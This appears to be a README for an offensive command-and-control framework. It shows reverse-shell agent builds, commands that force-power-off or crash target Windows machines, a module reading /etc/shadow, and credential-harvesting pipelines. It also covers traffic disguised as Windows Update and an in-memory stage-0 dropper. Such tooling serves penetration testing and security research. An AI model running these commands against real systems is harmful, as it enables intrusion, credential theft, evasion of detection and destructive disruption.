Supported languages: Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++, Binary.

---

## Plugin System

Drop a `.toml` file into `plugins/`. Supported `kind` values: `local`, `session`, `python`, `native` (compiled C/C++ on demand).

```toml
[[command]]
name    = "portscan"
kind    = "local"
shell   = "nmap -sV -p {arg0:-1-1000} {session_ip}"
timeout = 120
```

See [docs/C_PLUGIN_DEVELOPMENT.md](docs/C_PLUGIN_DEVELOPMENT.md) for the native C/C++ SDK.

### C-remote-shell Plugin

The [`C-remote-shell`](https://github.com/Levon-Volodin/C-remote-shell) submodule ships with a first-party plugin that integrates the Windows C agent directly into the operator console.

**Plugin file:** [`plugins/c_remote_shell.toml`](plugins/c_remote_shell.toml) + [`plugins/c_remote_shell.py`](plugins/c_remote_shell.py)

| Command | Description |
|---|---|
| `crs_build [lhost] [port]` | Compile the Windows C agent EXE (auto-detects MinGW / MSVC; bakes LHOST+PORT at compile time) |
| `crs_probe` | Run the 46-signal C2 compliance report against the C-remote-shell source tree |
| `crs_verbs` | List all wire verbs dispatched by the C agent; flags C-exclusive ones (`forceOff()`, `blueScreen()`) |
| `crs_payload_info` | Print the exact MinGW build flags for the current LHOST/PORT |
| `forceOff` | Send `forceOff()` to the active C session — force power-off via `NtSetSystemPowerState` ⚠ |
| `blueScreen` | Send `blueScreen()` to the active C session — BSOD via `NtRaiseHardError` ⚠ |

**Typical workflow:**

```
megaploit [0] » set lhost 10.0.0.1
megaploit [0] » set port 4444
megaploit [0] » crs_build              # compiles C-remote-shell/megaploit_c_agent.exe
megaploit [0] » crs_probe              # verify all 4 security layers pass

# Deploy the EXE + secret.key to the target, then:
megaploit [1] » forceOff               # C-exclusive: force power off
megaploit [1] » blueScreen             # C-exclusive: trigger BSOD
```

> **Requires:** `apt install mingw-w64` (Linux/macOS) or MSVC Developer Command Prompt (Windows).

---

## Module System (full reference)

### Writing a Module

```python
from megaploit.modules.base import Module, ModuleType, OptionType

class MyScanner(Module):
    name        = "auxiliary/scanner/my_scanner"
    module_type = ModuleType.AUXILIARY
    author      = "your-name"

    def _define_options(self) -> None:
        self._opt("RHOSTS", OptionType.STRING, required=True)

    def run(self, session=None) -> list:
        self.validate()
        self._emit(f"[*] Scanning {self.get('RHOSTS')}")
        self._ok("Found something", host=self.get("RHOSTS"))
        return self.results

MODULE = MyScanner
```

### AgentModule — Session-Bound Post Modules

```python
from megaploit.modules.base import AgentModule, ModuleType

class DumpShadow(AgentModule):
    name        = "post/linux/dump_shadow"
    module_type = ModuleType.POST

    def run(self, session=None):
        self.validate()
        output = self._send("shell cat /etc/shadow", session or self.session)
        if output.strip():
            self._ok("shadow file retrieved", shadow=output)
        return self.results

MODULE = DumpShadow
```

---

## AutoRunScript

Create `~/.megaploit_autorun.json`:

```json
{
  "global":  ["sysinfo", "whoami"],
  "windows": ["os_info", "installed_software", "ps"],
  "linux":   ["os_info", "find_suid", "env", "users"],
  "tags": {
    "dc":          ["hashdump", "users", "scheduled_tasks"],
    "workstation": ["browser_creds", "wifi_passwords", "ps"]
  }
}
```

---

## Post-Exploitation Pipeline

Named collection profiles that run automatically on every new session.

```
megaploit [1] » pipeline enable creds
megaploit [1] » pipeline enable recon
megaploit [1] » pipeline status
```

| Profile | Commands |
|---|---|
| `basic` | sysinfo, whoami, pwd, env |
| `creds` | hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault |
| `recon` | ps, installed_software, scheduled_tasks, users, os_info |
| `network` | arp, netstat, ifconfig |
| `full` | All of the above |

---

## Malleable C2 Profile

```yaml
name: "WindowsUpdate"
sleep: 60
jitter_max: 15
uri_paths:
  - "/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab"
request_headers:
  Host: "update.microsoft.com"
  User-Agent: "Windows-Update-Agent/10.0.10011.16384"
```

```python
from megaploit.core.profile import load_profile
profile = load_profile("profiles/windows_update.yaml")
headers = profile.build_http_headers()
time.sleep(profile.sleep_with_jitter())
```

---

## WebSocket Transport

Agents communicate over port 80/443 appearing as normal browser traffic.

```python
from megaploit.core.protocol import WsTransport
ws = WsTransport(conn, server_side=True)
ws.handshake()
data = ws.recv()
ws.send(b"response")
```

---

## Jobs System

```
megaploit [1] » jobs list
megaploit [1] » jobs kill a1b2c3
```

---

## Credential Store

All credentials from `hashdump`, `browser_creds`, `wifi_passwords`, `cred_vault`, `ssh_harvest` are auto-saved to SQLite.

```
megaploit [1] » creds show
megaploit [1] » creds search admin
megaploit [1] » creds export creds.json
```

---

## Reporting

```
megaploit [1] » report html pentest_report.html
megaploit [1] » report json pentest_report.json
```

---

## Web Dashboard

```
megaploit [1] » web start --port 8080
```

REST API: `GET /api/sessions` · `/api/creds` · `/api/jobs` · `/api/loot` · `POST /api/sessions/<id>/cmd` · `GET /events` (SSE)

---

## Multi-Operator RPC

```
megaploit [1] » rpc start --port 7777
megaploit [1] » rpc operators
```

JSON-RPC 2.0 over TCP. Methods: `auth`, `sessions.list/get`, `session.cmd`, `chat.send/history`, `notes.add/list`, `creds.list`.

---

## Go Agent

```
megaploit [1] » payload go_exe --out agent.exe
megaploit [1] » payload go_elf --out agent_linux
```

Features: AES-256-GCM, HMAC-SHA256, optional TLS, auto-reconnect with jitter.

---

## Staged Delivery

```
megaploit [1] » stage0 generate --start
megaploit [1] » stage0 status
megaploit [1] » stage0 stop
```

Stage-0 dropper authenticates with HMAC-SHA256, receives gzip-compressed stage-1 in-memory, executes — no disk write.

---

## Security Model

### Authentication
1. Server sends random 16-byte challenge
2. Agent responds with `HMAC-SHA256(secret_key, challenge)`
3. Verified with `hmac.compare_digest()` (constant-time)

### Transport Encryption (v2)
- **AES-256-GCM** per message, random 12-byte IV
- **Sequence numbers** — replay attacks detected and rejected

### TLS

**Auto-generate a self-signed cert (recommended):**

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --tls
```

Megaploit generates `loot/tls/megaploit.crt` and `loot/tls/megaploit.key` automatically (uses the `cryptography` package if installed, falls back to `openssl req`). The SHA-256 fingerprint is printed in the startup config box and reused on subsequent runs.

**Or inside the console at any time:**

```
megaploit [0] » tls auto       # generate & enable immediately
megaploit [0] » tls status     # show current cert path + fingerprint
megaploit [0] » tls regen      # force-generate a new cert
```

**Manual cert (bring your own):**

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
```

All TLS modes enforce TLS 1.2+ minimum, AEAD-only cipher suites (AES-GCM / ChaCha20-Poly1305), no renegotiation, no compression, forward secrecy required.

### Rate Limiter
5 failed attempts per 60s → auto-ban for 300s.

---

## Wire Protocol

```
[ uint32 length (4 bytes, big-endian) ][ AES-256-GCM ciphertext ]

Ciphertext:
[ uint64 sequence_number ][ JSON payload ]

WebSocket framing:
HTTP Upgrade → RFC 6455 binary frames → C2 framing inside frame payload
```

See [`megaploit/core/protocol.py`](megaploit/core/protocol.py) for the full implementation.

---

## Directory Layout

```
Megaploit-main/
├── server.py / agent.py / secret.key / requirements.txt / install.sh
│
├── C-remote-shell/              # Hardened Windows reverse shell (C) — git submodule
│
├── tests/                       # 507 tests — pytest
│   ├── test_meterp.py           # NEW v4: 69 tests for meterp handlers + session
│   ├── test_exploit_modules.py  # NEW v4: 156 tests for 20 exploit modules
│   ├── test_improvements.py     # v3: 61 tests for pipeline, profile, WsTransport
│   ├── test_commands.py / test_db.py / test_autorun.py / test_jobs.py
│   ├── test_modules_base.py / test_modules_registry.py
│   ├── test_payload_builder.py / test_payload_encoders.py
│   ├── test_protocol.py / test_reporting.py
│   └── conftest.py
│
├── docs/                        # MkDocs documentation → GitHub Pages
│   ├── ARCHITECTURE.md / CLI_REFERENCE.md / MODULE_SYSTEM.md
│   ├── NETWORKING.md / PAYLOAD_BUILDER.md / WEB_DASHBOARD.md
│   ├── C2_PROFILE.md / PIPELINE.md / C_PLUGIN_DEVELOPMENT.md
│
└── megaploit/
    ├── core/
    │   ├── protocol.py          # AES-256-GCM + WsTransport
    │   ├── c_probe.py           # C/C++ (.c .cpp .cc .cxx .h .hpp) compliance prober
    │   ├── pipeline.py / profile.py / autorun.py / jobs.py / staging.py
    ├── server/
    │   ├── commands.py          # 116 session command dispatchers
    │   └── meterp_session.py    # Meterpreter-class interactive console  ← NEW v4
    ├── agent/
    │   ├── handlers.py          # 90 agent-side handlers
    │   ├── meterp.py            # 16 advanced meterp handlers  ← NEW v4
    │   └── shell.py             # recv → handle → respond loop (imports meterp)
    ├── modules/
    │   ├── base.py / registry.py / auxiliary/
    │   └── exploits/            # 20 exploit modules  ← NEW v4
    └── payload/ / db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
```

---

## Running Tests

```bash
pip install pytest
python -m pytest -q                              # all 507 tests
python -m pytest tests/test_meterp.py -v        # v4 meterp tests (69)
python -m pytest tests/test_exploit_modules.py  # v4 exploit module tests (156)
python -m pytest tests/test_improvements.py     # v3 system tests (61)
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.

### Adding an Exploit Module

```python
from megaploit.modules.base import Module, ModuleType, OptionType

class MyExploit(Module):
    name        = "exploits/multi/http/my_exploit"
    description = "My exploit module"
    module_type = ModuleType.EXPLOIT
    rank        = 500

    def _define_options(self) -> None:
        self._opt("RHOSTS", OptionType.STRING,  required=True)
        self._opt("LHOST",  OptionType.ADDRESS, required=True)

    def check(self, session=None) -> str:
        self.validate()
        # probe target, return status string
        return "[+] Appears vulnerable"

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()
        self._ok("Exploited", host=self.get("RHOSTS"))
        return self.results

MODULE = MyExploit
```

Drop the file in `megaploit/modules/exploits/<platform>/<category>/` — the registry discovers it automatically on next `reload`.

### Adding a Meterp Extension

```python
# my_ext.py  (upload to target, then: load_extension my_ext.py)
def _grab_tokens(conn, args):
    import subprocess
    return subprocess.check_output(["cmdkey", "/list"], text=True, stderr=subprocess.DEVNULL)

HANDLERS = {
    "grab_tokens": _grab_tokens,
}
```

### Running Tests

```bash
python -m pytest tests/ -v --tb=short
```

---

## Documentation

Full documentation is available at **[https://josefifir.github.io/Megaploit/](https://josefifir.github.io/Megaploit/)** — auto-deployed from `docs/` on every push to `main`.

---

*Made with ❤️ for the security research community.*
